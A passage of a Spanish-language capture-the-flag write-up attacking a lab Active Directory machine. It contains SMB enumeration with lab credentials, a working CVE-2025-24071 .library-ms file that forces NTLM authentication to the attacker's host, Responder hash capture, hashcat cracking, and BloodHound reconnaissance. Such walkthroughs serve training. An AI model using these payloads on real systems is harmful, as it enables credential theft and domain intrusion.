</span></span><span style="display:flex;"><span>| Not valid before: 2025-04-17T16:04:17
</span></span><span style="display:flex;"><span>|_Not valid after:  2026-04-17T16:04:17
</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.fluffy.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2025-04-17T16:04:17
</span></span><span style="display:flex;"><span>|_Not valid after:  2026-04-17T16:04:17
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time.
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49678/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49680/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49698/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49704/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49776/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span>|   3:1:1:
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>| smb2-time:
</span></span><span style="display:flex;"><span>|   date: 2025-05-26T02:01:58
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 97.68 seconds
</span></span></code></pre></div><h1 id="smb-enumeration">SMB Enumeration<a hidden class="anchor" aria-hidden="true" href="#smb-enumeration">#</a></h1>
<p>Listado de recursos compartidos con smbclient:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbclient -N -L <span style="color:#ae81ff">\\\\</span>10.10.11.69
</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
</span></span><span style="display:flex;"><span>	---------       ----      -------
</span></span><span style="display:flex;"><span>	ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span>	C$              Disk      Default share
</span></span><span style="display:flex;"><span>	IPC$            IPC       Remote IPC
</span></span><span style="display:flex;"><span>	IT              Disk
</span></span><span style="display:flex;"><span>	NETLOGON        Disk      Logon server share
</span></span><span style="display:flex;"><span>	SYSVOL          Disk      Logon server share
</span></span><span style="display:flex;"><span>SMB1 disabled -- no workgroup available
</span></span></code></pre></div><p>Uso de netexec para listar las carpetas compartidas pero esta vez con las credenciales que tenemos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nxc smb 10.10.11.69 -u <span style="color:#e6db74">&#39;j.fleischman&#39;</span> -p <span style="color:#e6db74">&#39;J0elTHEM4n1990!&#39;</span> --shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:fluffy.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fluffy.htb<span style="color:#ae81ff">\j</span>.fleischman:J0elTHEM4n1990!
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             IT              READ,WRITE
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             NETLOGON        READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             SYSVOL          READ            Logon server share
</span></span></code></pre></div><p>Listado de usuarios con netexec.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nxc smb 10.10.11.69 -u <span style="color:#e6db74">&#39;j.fleischman&#39;</span> -p <span style="color:#e6db74">&#39;J0elTHEM4n1990!&#39;</span> --users
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:fluffy.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fluffy.htb<span style="color:#ae81ff">\j</span>.fleischman:J0elTHEM4n1990!
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             Administrator                 2025-04-17 15:45:01 <span style="color:#ae81ff">0</span>       Built-in account <span style="color:#66d9ef">for</span> administering the computer/domain
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             Guest                         &lt;never&gt;             <span style="color:#ae81ff">0</span>       Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             krbtgt                        2025-04-17 16:00:02 <span style="color:#ae81ff">0</span>       Key Distribution Center Service Account
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             ca_svc                        2025-04-17 16:07:50 <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             ldap_svc                      2025-04-17 16:17:00 <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             p.agila                       2025-04-18 14:37:08 <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             winrm_svc                     2025-05-18 00:51:16 <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             j.coffey                      2025-04-19 12:09:55 <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             j.fleischman                  2025-05-16 14:46:55 <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.69     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated <span style="color:#ae81ff">9</span> local users: FLUFFY
</span></span></code></pre></div><p>Ahora nos conectamos a la carpeta IT para ver que contiene.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbclient <span style="color:#ae81ff">\\\\</span>10.10.11.69<span style="color:#ae81ff">\\</span>IT -U FLUFFY.HTB0<span style="color:#ae81ff">\\</span>j.fleischman
</span></span><span style="display:flex;"><span>Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t load /etc/samba/smb.conf - run testparm to debug it
</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>FLUFFY.HTB0<span style="color:#ae81ff">\j</span>.fleischman<span style="color:#f92672">]</span>:
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">26</span> 02:26:36 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">26</span> 02:26:36 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  Everything-1.4.1.1026.x64           D        <span style="color:#ae81ff">0</span>  Fri Apr <span style="color:#ae81ff">18</span> 17:08:44 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  Everything-1.4.1.1026.x64.zip       A  <span style="color:#ae81ff">1827464</span>  Fri Apr <span style="color:#ae81ff">18</span> 17:04:05 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  KeePass-2.58                        D        <span style="color:#ae81ff">0</span>  Fri Apr <span style="color:#ae81ff">18</span> 17:08:38 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  KeePass-2.58.zip                    A  <span style="color:#ae81ff">3225346</span>  Fri Apr <span style="color:#ae81ff">18</span> 17:03:17 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  Upgrade_Notice.pdf                  A   <span style="color:#ae81ff">169963</span>  Sat May <span style="color:#ae81ff">17</span> 16:31:07 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">5842943</span> blocks of size 4096. <span style="color:#ae81ff">2074926</span> blocks available
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get Upgrade_Notice.pdf
</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\U</span>pgrade_Notice.pdf of size <span style="color:#ae81ff">169963</span> as Upgrade_Notice.pdf <span style="color:#f92672">(</span>128,8 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 128,8 KiloBytes/sec<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Vemos que tenemos varios archivos interesantes, primero vamos a ver que contiene el archivo de noticias en pdf.</p>
<p>Dentro del archivo PDF vemos que es un mensaje para los administradores, ya que al parecer han salido varios CVE y les indica que tienen que actualizar el sistema. Mirando los CVE críticos vemos que con uno de ellos tenemos la posibilidad de hacer spoofing para obtener hashes NTLM.</p>
<h2 id="cve-2025-24071-vulnerabilidad-de-spoofing-en-windows-file-explorer">CVE-2025-24071: Vulnerabilidad de Spoofing en Windows File Explorer<a hidden class="anchor" aria-hidden="true" href="#cve-2025-24071-vulnerabilidad-de-spoofing-en-windows-file-explorer">#</a></h2>
<p>Esta vulnerabilidad permite a atacantes no autenticados robar hashes NTLM mediante rutas SMB maliciosas.</p>
<p>Primero tenemos que crear el zip con el archivo .library-ms:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Contenido .library-ms</span>
</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;libraryDescription xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/windows/2009/library&#34;</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;name&gt;@%windir%<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\s</span>hell32.dll,-34575&lt;/name&gt;
</span></span><span style="display:flex;"><span>  &lt;ownerSID&gt;S-1-5-21-...&lt;/ownerSID&gt;
</span></span><span style="display:flex;"><span>  &lt;version&gt;1&lt;/version&gt;
</span></span><span style="display:flex;"><span>  &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
</span></span><span style="display:flex;"><span>  &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
</span></span><span style="display:flex;"><span>  &lt;templateInfo&gt;
</span></span><span style="display:flex;"><span>    &lt;folderType&gt;<span style="color:#f92672">{</span>7d49d726-3c21-4f05-99aa-fdc2c9474656<span style="color:#f92672">}</span>&lt;/folderType&gt;
</span></span><span style="display:flex;"><span>  &lt;/templateInfo&gt;
</span></span><span style="display:flex;"><span>  &lt;searchConnectorDescriptionList&gt;
</span></span><span style="display:flex;"><span>    &lt;searchConnectorDescription&gt;
</span></span><span style="display:flex;"><span>      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
</span></span><span style="display:flex;"><span>      &lt;isSupported&gt;false&lt;/isSupported&gt;
</span></span><span style="display:flex;"><span>      &lt;simpleLocation&gt;
</span></span><span style="display:flex;"><span>        &lt;url&gt;<span style="color:#ae81ff">\\</span>10.10.15.254<span style="color:#ae81ff">\R</span>ecurso&lt;/url&gt;
</span></span><span style="display:flex;"><span>      &lt;/simpleLocation&gt;
</span></span><span style="display:flex;"><span>    &lt;/searchConnectorDescription&gt;
</span></span><span style="display:flex;"><span>  &lt;/searchConnectorDescriptionList&gt;
</span></span><span style="display:flex;"><span>&lt;/libraryDescription&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Crear archivo zip</span>
</span></span><span style="display:flex;"><span>❯ zip archivo.zip .library-ms
</span></span><span style="display:flex;"><span>  adding: .library-ms <span style="color:#f92672">(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Ahora lanzamos el responder para que este en escucha:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sudo responder -I tun0 -v
</span></span><span style="display:flex;"><span>                                         __
</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#f92672">||</span>  -__|   _|
</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#f92672">||</span>_____|__|
</span></span><span style="display:flex;"><span>                   |__|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...SNIP...
</span></span></code></pre></div><p>Una vez tenemos el archivo creado entramos en el smb con el usuario j.fleischman y introducimos el zip en la carpeta compartida.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbclient <span style="color:#ae81ff">\\\\</span>10.10.11.69<span style="color:#ae81ff">\\</span>IT -U FLUFFY.HTB0<span style="color:#ae81ff">\\</span>j.fleischman
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> put archivo.zip
</span></span></code></pre></div><p>Y una vez enviado el archivo recibimos el hash del usuario p.agila.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.10.11.69
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : FLUFFY<span style="color:#ae81ff">\p</span>.agila
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : p.agila::FLUFFY:0d5725cb3993aefb:3E2D99869B1807BC7201A3C72CB70E41:0101000000000000807ACEF0F3CEDB01DFBB958C0D542FA80000000002000800550041005300420001001E00570049004E002D005200360056004F0051004D0049004F0043003500370004003400570049004E002D005200360056004F0051004D0049004F004300350037002E0055004100530042002E004C004F00430041004C000300140055004100530042002E004C004F00430041004C000500140055004100530042002E004C004F00430041004C0007000800807ACEF0F3CEDB01060004000200000008003000300000000000000001000000002000009FC3B061493F30639391BA57147CE34911B4B5984C24BC2A50E33711726D93A70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200350034000000000000000000
</span></span></code></pre></div><p>Ahora craqueamos el hash NTLMv2.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ hashcat -m <span style="color:#ae81ff">5600</span> --force -a <span style="color:#ae81ff">0</span> responder.hashes /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You have enabled --force to bypass dangerous warnings and errors!
</span></span><span style="display:flex;"><span>This can hide serious problems and should only be <span style="color:#66d9ef">done</span> when debugging.
</span></span><span style="display:flex;"><span>Do not report hashcat issues encountered when using --force.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/sys/bus/pci/devices/0000:04:00.0/hwmon/hwmon5/pwm1: No such file or directory
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 2.1 AMD-APP.dbg <span style="color:#f92672">(</span>3649.0<span style="color:#f92672">))</span> - Platform <span style="color:#75715e">#1 [Advanced Micro Devices, Inc.]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================================================================================</span>
</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#1: AMD Radeon 680M, 7648/15418 MB (6552 MB allocatable), 6MCU</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Optimizers applied:
</span></span><span style="display:flex;"><span>* Zero-Byte
</span></span><span style="display:flex;"><span>* Not-Iterated
</span></span><span style="display:flex;"><span>* Single-Hash
</span></span><span style="display:flex;"><span>* Single-Salt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
</span></span><span style="display:flex;"><span>Pure kernels can crack longer passwords, but drastically reduce performance.
</span></span><span style="display:flex;"><span>If you want to switch to optimized kernels, append -O to your commandline.
</span></span><span style="display:flex;"><span>See the above message to find out about the exact limits.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">105</span> MB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Dictionary cache hit:
</span></span><span style="display:flex;"><span>* Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344384</span>
</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921497</span>
</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344384</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>P.AGILA::FLUFFY:0d5725cb3993aefb:3e2d99869b1807bc7201a3c72cb70e41:0101000000000000807acef0f3cedb01dfbb958c0d542fa80000000002000800550041005300420001001e00570049004e002d005200360056004f0051004d0049004f0043003500370004003400570049004e002d005200360056004f0051004d0049004f004300350037002e0055004100530042002e004c004f00430041004c000300140055004100530042002e004c004f00430041004c000500140055004100530042002e004c004f00430041004c0007000800807acef0f3cedb01060004000200000008003000300000000000000001000000002000009fc3b061493f30639391ba57147ce34911b4b5984c24bc2a50e33711726d93a70a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003200350034000000000000000000:prometheusx-303
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Session..........: hashcat
</span></span><span style="display:flex;"><span>Status...........: Cracked
</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">5600</span> <span style="color:#f92672">(</span>NetNTLMv2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Hash.Target......: P.AGILA::FLUFFY:0d5725cb3993aefb:3e2d99869b1807bc72...000000
</span></span><span style="display:flex;"><span>Time.Started.....: Tue May <span style="color:#ae81ff">27</span> 11:45:03 2025, <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Time.Estimated...: Tue May <span style="color:#ae81ff">27</span> 11:45:04 2025, <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Speed.#1.........: 11806.1 kH/s <span style="color:#f92672">(</span>7.08ms<span style="color:#f92672">)</span> @ Accel:2048 Loops:1 Thr:32 Vec:1
</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Progress.........: 4718592/14344384 <span style="color:#f92672">(</span>32.90%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Rejected.........: 0/4718592 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Restore.Point....: 4325376/14344384 <span style="color:#f92672">(</span>30.15%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
</span></span><span style="display:flex;"><span>Candidates.#1....: redskins127 -&gt; pequeñatraviesa
</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Temp: 61c Util:  0% Core: 533MHz Mem:2400MHz Bus:16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Started: Tue May <span style="color:#ae81ff">27</span> 11:44:44 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>Stopped: Tue May <span style="color:#ae81ff">27</span> 11:45:05 <span style="color:#ae81ff">2025</span>
</span></span></code></pre></div><h1 id="bloodhound-enumeration">Bloodhound Enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
<p>Ahora con el nuevo usuario, vamos a lanzar el comando <code>bloodhoun-python</code> con el cual podremos enumerar el dominio en <code>BloodhoundCE</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ bloodhound-python -u p.agila -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> -d fluffy.htb -ns 10.10.11.69 -c all --zip
</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>INFO: Found AD domain: fluffy.htb
</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
</span></span><span style="display:flex;"><span>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span style="color:#f92672">[</span>Errno Connection error <span style="color:#f92672">(</span>dc01.fluffy.htb:88<span style="color:#f92672">)]</span> <span style="color:#f92672">[</span>Errno -2<span style="color:#f92672">]</span> Name or service not known
</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.fluffy.htb
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.fluffy.htb
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">10</span> users
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">54</span> groups
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> ous
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
</span></span><span style="display:flex;"><span>INFO: Querying computer: DC01.fluffy.htb
</span></span><span style="display:flex;"><span>INFO: Done in 00M 17S
</span></span><span style="display:flex;"><span>INFO: Compressing output into 20250527133042_bloodhound.zip
</span></span></code></pre></div><p>Vemos que el bloodhound nos indica que el usuario p.agila es miembro de SERVICES ACCOUNTS MANAGER y ese grupo tiene permisos <code>genericALL</code> sobre el grupo SERVICES ACCOUNTS que tiene permisos <code>genericWrite</code> sobre 3 cuentas.</p>
<p><img alt="Fluffy Machine 2" loading="lazy" src="/write-ups/active_directory/easy/fluffy/fotos/Fluffy_Machine_2.png"></p>
<p><img alt="Fluffy Machine 3" loading="lazy" src="/write-ups/active_directory/easy/fluffy/fotos/Fluffy_Machine_3.png"></p>
